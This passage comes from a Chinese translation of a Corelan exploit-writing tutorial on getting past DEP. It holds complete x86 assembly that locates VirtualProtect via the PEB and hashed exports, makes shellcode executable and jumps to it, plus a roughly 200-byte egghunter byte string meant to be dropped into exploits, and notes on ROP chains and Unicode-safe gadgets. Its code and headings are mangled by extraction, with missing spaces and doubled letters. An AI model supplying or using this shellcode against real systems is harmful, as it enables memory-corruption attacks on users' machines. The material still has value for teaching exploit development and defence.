这是小的，但不是一个真正通用的egg hunter。
因此我们要使它更可移植性（和更大）。如果大小不重要的话，那么这是一种使它成功的通
用方法：
（只要在asm代码中编辑“shellcode_size”和“writeable_address”来匹配你的特殊
exploit，然后你可以用它了）
;----------------------------------------
;quickanddirtyasm
;tolocateVirtualProtect
;useittomakeshellcodeatedi
;executable,andjumptoit
;
;PeterVanEeckhoutte'corelanc0d3r
;http://www.corelan.be:8800
;----------------------------------------
;modifythesevalues
;tomatchyourenvironment
shellcode_sizeequ0x100
writeable_addressequ0x10035005
hash_virtualprotectequ0x7946C61B
;
;
[BITS32]
global_start
_start:
FLDPI
FSTENV[ESP-0xC]
popeax
pushedi ;saveshellcodelocation
pusheax ;currentlocation
xoredx,edx
movdl,0x7D ;offsettostart_main
;skylinedtechnique
XOR ECX,ECX ;ECX=0
MOV ESI,[FS:ECX+0x30];ESI=&(PEB)([FS:0x30])
MOV ESI,[ESI+0x0C] ;ESI=PEB->Ldr
MOV ESI,[ESI+0x1C] ;ESI=PEB->Ldr.InInitOrder
next_module:
MOV EAX,[ESI+0x08] ;EBP=InInitOrder[X].base_address
MOV EDI,[ESI+0x20] ;EBP=InInitOrder[X].module_name(unicode)
MOV ESI,[ESI] ;ESI=InInitOrder[X].flink(nextmodule)
CMP [EDI+12*2],CL ;modulename[12]==0?
JNE next_module ;No:trynextmodule.
;jmpstart_main ;replacethiswithrelativejumpforward
popecx
addecx,edx
jmpecx ;jmpstart_main
;=======Function:Findfunctionbaseaddress============
find_function:
pushad ;saveallregisters
movebp, [esp + 0x24] ;putbaseaddressofmodulethatisbeing
;loadedinebp
moveax, [ebp + 0x3c] ;skipoverMSDOSheader
movedx, [ebp + eax + 0x78];gotoexporttableandputrelativeaddress
;inedx
addedx, ebp ;addbaseaddresstoit.
;edx=absoluteaddressofexporttable
movecx, [edx + 0x18] ;setupcounterECX
;(howmanyexporteditemsareinarray?)
movebx, [edx + 0x20] ;putnamestablerelativeoffsetinebx
addebx, ebp ;addbaseaddresstoit.
;ebx=absoluteaddressofnamestable
find_function_loop:
jecxz find_function_finished ;ifecx=0,thenlastsymbolhasbeenchecked.
;(shouldneverhappen)
;unlessfunctioncouldnotbefound
dececx ;ecx=ecx-1
movesi, [ebx + ecx * 4] ;getrelativeoffsetofthenameassociated
;withthecurrentsymbol
;andstoreoffsetinesi
addesi, ebp ;addbaseaddress.
;esi=absoluteaddressofcurrentsymbol
compute_hash:
xoredi, edi ;zerooutedi
xoreax, eax ;zeroouteax
cld ;cleardirectionflag.
;willmakesurethatitincrementsinsteadof
;decrementswhenusinglods*
compute_hash_again:
lodsb ;loadbytesatesi(currentsymbolname)
;intoal,+incrementesi
testal, al ;bitwisetest:
;seeifendofstringhasbeenreached
jz compute_hash_finished ;ifzeroflagisset=endofstringreached
roredi, 0xd ;ifzeroflagisnotset,rotatecurrent
;valueofhash13bitstotheright
addedi, eax ;addcurrentcharacterofsymbolname
;tohashaccumulator
jmpcompute_hash_again ;continueloop
compute_hash_finished:
find_function_compare:
cmpedi, [esp + 0x28] ;seeifcomputedhashmatchesrequestedhash
;(atesp+0x28)
;edi=currentcomputedhash
;esi=currentfunctionname(string)
jnzfind_function_loop ;nomatch,gotonextsymbol
movebx, [edx + 0x24] ;ifmatch:extractordinalstable
;relativeoffsetandputinebx
addebx, ebp ;addbaseaddress.
;ebx=absoluteaddressofordinalsaddresstable
movcx, [ebx + 2 * ecx] ;getcurrentsymbolordinalnumber(2bytes)
movebx, [edx + 0x1c] ;getaddresstablerelativeandputinebx
addebx, ebp ;addbaseaddress.
;ebx=absoluteaddressofaddresstable
moveax, [ebx + 4 * ecx] ;getrelativefunctionoffsetfromitsordinal
;andputineax
addeax, ebp ;addbaseaddress.
;eax=absoluteaddressoffunctionaddress
mov[esp + 0x1c], eax ;overwritestackcopyofeaxsopopad
;willreturnfunctionaddressineax
find_function_finished:
popad ;retrieveoriginalregisters.
;eaxwillcontainfunctionaddress
Ret
;-----------MAIN-------------
start_main:
movdl,0x04
subesp,edx ;allocatespaceonstack
movebp,esp ;setebpasframeptrforrelativeoffset
movedx,eax ;savebaseaddressofkernel32inedx
;findVirtualProtect
pushhash_virtualprotect
pushedx
callfind_function
;VirtualProtectisineaxnow
;getshellcodelocationback
popedi
popedi
popedi
popedi
pushwriteable_address ;param5:writableaddress
;generate0x40(para4)
xorebx,ebx
addbl,0x40
pushebx ;param4:flNewProtect
;shellcodelength
addebx,0x7FFFFFBF ;tocompensatefor40alreadyinebx
subebx,0x7FFFFFFF-shellcode_size
pushebx ;param3:size:0x300bytesinthiscase
pushedi ;param2:lpAddress
pushedi ;param1:returnaddress
pusheax ;VirtualProtect
ret
和egghunter结合，代码是这样的：
#-------------------------------------------------------------------
#corelanc0d3r-egghunterwhichwillmarkshellcodelocexecutable
#andthenjumpstoit
#WorksonallOSes(32bit)(dynamicVirtualProtect()lookup
#non-optimized-canbemadealotsmaller!
#
#Currenthardcodedvalues:
# -shellcodesize:300bytes
# -writeableaddress:0x10035005
#-------------------------------------------------------------------
my$egghunter=
"\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02".
"\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"\x77\x30\x30\x74".#w00t
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF".
#shellcodeisnowlocated.pointerisatedi
#dynamiccalltoVirtualProtect&jumptoshellcode
"\xd9\xeb\x9b\xd9\x74\x24\xf4\x58".
"\x57\x50\x31\xd2\xb2\x7d\x31\xc9".
"\x64\x8b\x71\x30\x8b\x76\x0c\x8b".
"\x76\x1c\x8b\x46\x08\x8b\x7e\x20".
"\x8b\x36\x38\x4f\x18\x75\xf3\x59".
"\x01\xd1\xff\xe1\x60\x8b\x6c\x24".
"\x24\x8b\x45\x3c\x8b\x54\x05\x78".
"\x01\xea\x8b\x4a\x18\x8b\x5a\x20".
"\x01\xeb\xe3\x37\x49\x8b\x34\x8b".
"\x01\xee\x31\xff\x31\xc0\xfc\xac".
"\x84\xc0\x74\x0a\xc1\xcf\x0d\x01".
"\xc7\xe9\xf1\xff\xff\xff\x3b\x7c".
"\x24\x28\x75\xde\x8b\x5a\x24\x01".
"\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c".
"\x01\xeb\x8b\x04\x8b\x01\xe8\x89".
"\x44\x24\x1c\x61\xc3\xb2\x04\x29".
"\xd4\x89\xe5\x89\xc2\x68\x1b\xc6".
"\x46\x79\x52\xe8\x9c\xff\xff\xff".
"\x5f\x5f\x5f\x5f\x68\x05\x50\x03".
"\x10\x31\xdb\x80\xc3\x40\x53\x81".
"\xc3\xbf\xff\xff\x7f\x81\xeb\xff".
"\xfe\xff\x7f\x53\x57\x57\x50\xc3";
200字节对一个egghunter来说有点大，它可以最优化一点（对你来说是好练习）。另一方面，
200字节将会很好地适合WPM()，因此你有很多选择来使它成功。
方案 2222：预先考虑 sssshhhheeeellllllllccccooooddddeeee
如果你没有足够的空间来容纳28（或者通用版的200字节），那么你可以这样做：
取出“jmpedi”指令，然后用“pushedi”，“ret”（x57xc3）代替。
那么，在shellcode中，在标签（w00tw00t）和shellcode自身之间，你将不得不介绍一个能
使当前页可执行然后运行它的rop链。
如果到目前为止你理解这个教程，你应该知道怎么实现。
UUUUnnnniiiiccccooooddddeeee
倘使你的缓冲区从属于unicode？好的，答案很简单：你需要找到指向rop小配件的兼容
unicode的指针。
“pvefindaddrrop”将会指示一个指针是否是兼容unicode...确保不要对函数用“nonull”关
键字或者不用任何unicode地址。很明白unicode会减少一个exploit的成功机会（因为可用
的指针数量是有限的）